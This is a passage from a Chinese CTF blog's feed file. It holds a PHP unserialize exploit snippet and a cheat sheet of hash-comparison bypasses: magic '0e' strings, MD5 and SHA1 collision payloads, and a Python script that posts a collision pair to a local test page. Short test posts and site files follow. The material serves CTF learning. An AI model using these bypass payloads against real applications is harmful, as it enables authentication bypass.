language_">$this</span>-&gt;b-&gt;lll;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;test&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>exp 如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$A1</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$A2</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$B1</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$B2</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$A1</span>-&gt;a = <span class="variable">$B1</span>;</span><br><span class="line"><span class="variable">$B1</span>-&gt;b = <span class="variable">$A2</span>;</span><br><span class="line"><span class="variable">$A2</span>-&gt;c = <span class="variable">$B2</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$A1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$a</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title function_ invoke__">B</span>(<span class="literal">null</span>))), <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><h1 id="结尾">结尾</h1><p>参考文献<br><a href="https://5ime.cn/unserialize.html">https://5ime.cn/unserialize.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的哈希函数绕过个人收藏</title>
      <link href="/posts/66a71aff.html"/>
      <url>/posts/66a71aff.html</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1><ul><li>php 对 MD5 加密方法为$a=md5(‘string’);比起 python 就是神仙级，壮哉 php。</li><li>php 中存在强比较(==/!=)和弱比较(===/!==)，两个数组能绕过强和弱两个比较(a[]=1&amp;b[]=2)，因为 md5 不会处理数组，返回的结果都为 bool(false)</li><li>0e+纯数字的字符串会使 php 误认为是科学计数法, 从而转换为 0。</li><li><ul><li>只能绕过弱比较，<strong>且仅为 0e 开头的字符串是不能绕过比较的。</strong></li></ul></li><li>md5($password,‘true’)-&gt;ffifdyop 多用于 sql 绕过密码</li></ul><h1 id="MD4">MD4</h1><h2 id="md4-等于自己-a-md4-a">md4 等于自己 -&gt; $a==md4($a);</h2><pre><code>0e251288019 0e898201062</code></pre><h1 id="MD5">MD5</h1><h2 id="md5-后-0e-数字-md5-a-md5-b">md5 后 0e+数字 -&gt; md5($a)==md5($b)</h2><p>部分</p><pre><code>byGcY sonZ7y QNKCDZO 240610708 s878926199a s155964671a s214587387a</code></pre><h2 id="md5-后-等于自己-a-md5-a">md5 后 等于自己 -&gt; $a==md5($a)</h2><p>很多</p><pre><code>0e215962017 0e00275209979 0e00506035745 0e005404518110e00678205148 0e00741250258 0e00928251504 0e013500161140e01352028862 0e01392313004 0e01875552079 0e019759039830e02042356163 0e02218562930 0e02451355147 0e027399702940e02760920150 0e02784726287 0e03298616350 0e03393034171</code></pre><h2 id="双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）">双 md5 后等于自己 -&gt; $a==md5(md5($a)) （没错真的有这个数）</h2><p>0e1138100474</p><h2 id="单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a">单 md5 后等于双 md5 后的自己 -&gt; md5($a)==md5(md5($a))</h2><p>（没找到，找到补上）</p><h2 id="如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下">如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下</h2><p>那你可以试试 INF 和 NAN 两个数字，因为无法求值，它们的 md5 值就是字符串的 md5 值</p><h2 id="md5-强相等碰撞-md5-a-md5-b-md5-c">md5 强相等碰撞 -&gt; md5($a)===md5($b)===md5($c)</h2><pre><code>a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&amp;c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</code></pre><p>数据大抵是没有问题的，出错可以试着检查下是否支持 url 编码，这里点名 绿色 hackbar，感觉直接传 url 编码的参数总会报错。打 web 做这种题一定要用 burpsuite 传参，鬼知道出什么问题，，<s>有能力的可以 python 写 request</s><br>2025注：已补上python脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/test.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: <span class="string">b&quot;\xaf\x13\x76\x70\x82\xa0\xa6\x58\xcb\x3e\x23\x38\xc4\xc6\xdb\x8b\x60\x2c\xbb\x90\x68\xa0\x2d\xe9\x47\xaa\x78\x49\x6e\x0a\xc0\xc0\x31\xd3\xfb\xcb\x82\x25\x92\x0d\xcf\x61\x67\x64\xe8\xcd\x7d\x47\xba\x0e\x5d\x1b\x9c\x1c\x5c\xcd\x07\x2d\xf7\xa8\x2d\x1d\xbc\x5e\x2c\x06\x46\x3a\x0f\x2d\x4b\xe9\x20\x1d\x29\x66\xa4\xe1\x8b\x7d\x0c\xf5\xef\x97\xb6\xee\x48\xdd\x0e\x09\xaa\xe5\x4d\x6a\x5d\x6d\x75\x77\x72\xcf\x47\x16\xa2\x06\x72\x71\xc9\xa1\x8f\x00\xf6\x9d\xee\x54\x27\x71\xbe\xc8\xc3\x8f\x93\xe3\x52\x73\x73\x53\xa0\x5f\x69\xef\xc3\x3b\xea\xee\x70\x71\xae\x2a\x21\xc8\x44\xd7\x22\x87\x9f\xbe\x79\x6d\xc4\x61\xa4\x08\x57\x02\x82\x2a\xef\x36\x95\xda\xee\x13\xbc\xfb\x7e\xa3\x59\x45\xef\x25\x67\x3c\xe0\x27\x69\x2b\x95\x77\xb8\xcd\xdc\x4f\xde\x73\x24\xe8\xab\x66\x74\xd2\x8c\x68\x06\x80\x0c\xdd\x74\xae\x31\x05\xd1\x15\x7d\xc4\x5e\xbc\x0b\x0f\x21\x23\xa4\x96\x7c\x17\x12\xd1\x2b\xb3\x10\xb7\x37\x60\x68\xd7\xcb\x35\x5a\x54\x97\x08\x0d\x54\x78\x49\xd0\x93\xc3\xb3\xfd\x1f\x0b\x35\x11\x9d\x96\x1d\xba\x64\xe0\x86\xad\xef\x52\x98\x2d\x84\x12\x77\xbb\xab\xe8\x64\xda\xa3\x65\x55\x5d\xd5\x76\x55\x57\x46\x6c\x89\xc9\xdf\xb2\x3c\x85\x97\x1e\xf6\x38\x66\xc9\x17\x22\xe7\xea\xc9\xf5\xd2\xe0\x14\xd8\x35\x4f\x0a\x5c\x34\xd3\x73\xa5\x98\xf7\x66\x72\xaa\x43\xe3\xbd\xa2\xcd\x62\xfd\x69\x1d\x34\x30\x57\x52\xab\x41\xb1\x91\x65\xf2\x30\x7f\xcf\xc6\xa1\x8c\xfb\xdc\xc4\x8f\x61\xa5\x93\x40\x1a\x13\xd1\x09\xc5\xe0\xf7\x87\x5f\x48\xe7\xd7\xb3\x62\x04\xa7\xc4\xcb\xfd\xf4\xff\xcf\x3b\x74\x28\x1c\x96\x8e\x09\x73\x3a\x9b\xa6\x2f\xed\xb7\x99\xd5\xb9\x05\x39\x95\xab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: <span class="string">b&quot;\xaf\x13\x76\x70\x82\xa0\xa6\x58\xcb\x3e\x23\x38\xc4\xc6\xdb\x8b\x60\x2c\xbb\x90\x68\xa0\x2d\xe9\x47\xaa\x78\x49\x6e\x0a\xc0\xc0\x31\xd3\xfb\xcb\x82\x25\x92\x0d\xcf\x61\x67\x64\xe8\xcd\x7d\x47\xba\x0e\x5d\x1b\x9c\x1c\x5c\xcd\x07\x2d\xf7\xa8\x2d\x1d\xbc\x5e\x2c\x06\x46\x3a\x0f\x2d\x4b\xe9\x20\x1d\x29\x66\xa4\xe1\x8b\x7d\x0c\xf5\xef\x97\xb6\xee\x48\xdd\x0e\x09\xaa\xe5\x4d\x6a\x5d\x6d\x75\x77\x72\xcf\x47\x16\xa2\x06\x72\x71\xc9\xa1\x8f\x00\xf6\x9d\xee\x54\x27\x71\xbe\xc8\xc3\x8f\x93\xe3\x52\x73\x73\x53\xa0\x5f\x69\xef\xc3\x3b\xea\xee\x70\x71\xae\x2a\x21\xc8\x44\xd7\x22\x87\x9f\xbe\x79\x6d\xc4\x61\xa4\x08\x57\x02\x82\x2a\xef\x36\x95\xda\xee\x13\xbc\xfb\x7e\xa3\x59\x45\xef\x25\x67\x3c\xe0\x27\x69\x2b\x95\x77\xb8\xcd\xdc\x4f\xde\x73\x24\xe8\xab\x66\x74\xd2\x8c\x68\x06\x80\x0c\xdd\x74\xae\x31\x05\xd1\x15\x7d\xc4\x5e\xbc\x0b\x0f\x21\x23\xa4\x96\x7c\x17\x12\xd1\x2b\xb3\x10\xb7\x37\x60\x68\xd7\xcb\x35\x5a\x54\x97\x08\x0d\x54\x78\x49\xd0\x93\xc3\xb3\xfd\x1f\x0b\x35\x11\x9d\x96\x1d\xba\x64\xe0\x86\xad\xef\x52\x98\x2d\x84\x12\x77\xbb\xab\xe8\x64\xda\xa3\x65\x55\x5d\xd5\x76\x55\x57\x46\x6c\x89\xc9\x5f\xb2\x3c\x85\x97\x1e\xf6\x38\x66\xc9\x17\x22\xe7\xea\xc9\xf5\xd2\xe0\x14\xd8\x35\x4f\x0a\x5c\x34\xd3\xf3\xa5\x98\xf7\x66\x72\xaa\x43\xe3\xbd\xa2\xcd\x62\xfd\xe9\x1d\x34\x30\x57\x52\xab\x41\xb1\x91\x65\xf2\x30\x7f\xcf\xc6\xa1\x8c\xfb\xdc\xc4\x8f\x61\xa5\x13\x40\x1a\x13\xd1\x09\xc5\xe0\xf7\x87\x5f\x48\xe7\xd7\xb3\x62\x04\xa7\xc4\xcb\xfd\xf4\xff\xcf\x3b\x74\xa8\x1b\x96\x8e\x09\x73\x3a\x9b\xa6\x2f\xed\xb7\x99\xd5\x39\x05\x39\x95\xab&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="md5-相同生成工具-fastcoll">md5 相同生成工具 fastcoll</h2><p><a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p><pre><code>fastcoll -o a a1</code></pre><p>可以得到两个相同的 MD5 值的文件，ulencode 后传入。</p><h1 id="SHA1">SHA1</h1><h2 id="sha1-后-0e-数字-sha1-a-sha1-b">sha1 后 0e+数字 -&gt; sha1($a)==sha1($b)</h2><p>aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m<br>f2WfQ iv2Cn</p><h2 id="sha1-强相等碰撞-sha1-a-sha1-b">sha1 强相等碰撞 -&gt; sha1($a)===sha1($b)</h2><pre><code>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></pre><h2 id="sha1-后等于自己-sha1-a-a">sha1 后等于自己 -&gt; sha1($a)==$a</h2><pre><code>              text                                            SHA1 Hash0e00000000000000000000081614617300000000 ==&gt; 0e653075259409996322874922854682592190700e00000000000000000000721902017120000000 ==&gt; 0e949811594982522954181824538411404832740e01011001101011010001101110101100101000 ==&gt; 0e489065231519767511176774637871111065980e11001000001010011000100000010001101000 ==&gt; 0e634071849609304190270627777050813794520e01000001100000001010011011001000000100 ==&gt; 0e559620723883970838143467337186982137960e10011110000101101000011101011010100100 ==&gt; 0e311885854172858287853553367742377127920e01010111000111111010101011010111010100 ==&gt; 0e459063445696166594288088920912619691810e00100001110000001111010000010011101100 ==&gt; 0e148602586690523325495686077104381329530e11110000111010001001101111111110010010 ==&gt; 0e121742584363857585528744269416865384830e10111110011100101100010101111010000110 ==&gt; 0e997743982825933760434620385722813853890e11001111110111110010111010000011110110 ==&gt; 0e631852213010346249403454710743578887970e00001010010101100100101011101110001110 ==&gt; 0e909439887721717490544135938881059867820e01011101110010111011110010010010101110 ==&gt; 0e016088001926598035767713466074417378260e10111110101111001000000100011101101110 ==&gt; 0e490945414584794952630342944210251869380e11100111101110011010111001010101111110 ==&gt; 0e557707061499487600862007135058418875430e11111001010101100110011001010001110001 ==&gt; 0e911206871211638095158241354350299581370e01000111101111110010010010000001001001 ==&gt; 0e780717973285463693018254208488724518490e00100110100010100110001101110110110101 ==&gt; 0e060773804082606146592199205610827676320e11111100001011000011110100100010111101 ==&gt; 0e121491203544153352207583994927139215880e00111100110101101001000101011011111101 ==&gt; 0e386611265697905555984319050654038705160e10100011100101000001110010100110100011 ==&gt; 0e557450781546402125115962590559102780700e10011110011111001001100100000111011011 ==&gt; 0e20319731123101477913295720812414482217</code></pre><h1 id="自己爆破用脚本">自己爆破用脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5哈希值是否以0e开头并且后面跟随纯数字&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_valid_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力求解a，使得md5(a)和md5(md5(a))都满足条件&quot;&quot;&quot;</span></span><br><span class="line">    chars = (</span><br><span class="line">        string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    )  <span class="comment"># 允许的字符集</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 控制a的长度</span></span><br><span class="line">        <span class="built_in">print</span>(length)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            a = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_a = hashlib.md5(a.encode()).hexdigest()</span><br><span class="line">            md5_md5_a = hashlib.md5(md5_a.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> is_valid_md5(md5_a) <span class="keyword">and</span> is_valid_md5(md5_md5_a):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found a: <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(a): <span class="subst">&#123;md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(md5(a)): <span class="subst">&#123;md5_md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力求解</span></span><br><span class="line">find_valid_a()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="哈希长度拓展攻击">哈希长度拓展攻击</h1><p>已知部分字符串需要构造相同 md5 值<br>需要知道 key 长度</p><h1 id="说在后面">说在后面</h1><p>我在一开始学习 MD5 绕过时吃了很多亏。还是被勾币出题人拷打少了，导致很多打只能自己硬咽下去。这是博客的一篇文章，在写之时深深感慨自己在茫茫搜索 MD5 时的无力，到自己写时，大大弥补加了很多自己当时搜索时的关键词，希望有点帮助吧。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/posts/d87f7e0c.html"/>
      <url>/posts/d87f7e0c.html</url>
      
        <content type="html"><![CDATA[<p>不要学我熬夜做东西。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Markdown格式测试</title>
      <link href="/posts/db60f10c.html"/>
      <url>/posts/db60f10c.html</url>
      
        <content type="html"><![CDATA[<h1 id="这是一级标题">这是一级标题</h1><h2 id="这是二级标题">这是二级标题</h2><h3 id="这是三级标题">这是三级标题</h3><p>正文这么打</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> this is terminal <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/">这是超链接</a></p><p><a href="https://www.baidu.com">https://www.baidu.com</a><br><img src="http://www.wazhishi.com/uploads/allimg/240328/0K453B43-0.jpg"><br>不论怎么讲，会战兵力是八十万对六十万，优势在我</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/README.html"/>
      <url>/README.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://app.netlify.com/projects/iloveggbond/deploys"><img src="https://api.netlify.com/api/v1/badges/f158275c-4bbb-4eeb-b63d-0ed1122f6107/deploy-status" alt="Netlify Status"></a></p><h1 id="Local-Deployment">Local Deployment</h1><p>确认你安装了 node 和 git</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g n</span><br><span class="line"><span class="built_in">sudo</span> n latest</span><br><span class="line">npm install -g npm@latest</span><br><span class="line"><span class="built_in">rm</span> -rf node_modules package-lock.json</span><br><span class="line">npm cache clean --force</span><br><span class="line">npm install</span><br><span class="line">npm run netlify</span><br></pre></td></tr></table></figure>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"hatchet的个人博客","short_name":"hatchet的个人博客","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/site-icons/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/site-icons/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/site-icons/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/site-icons/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/site-icons/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/site-icons/256.png","sizes":"256x256","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/package.json"/>
      <url>/package.json</url>
      
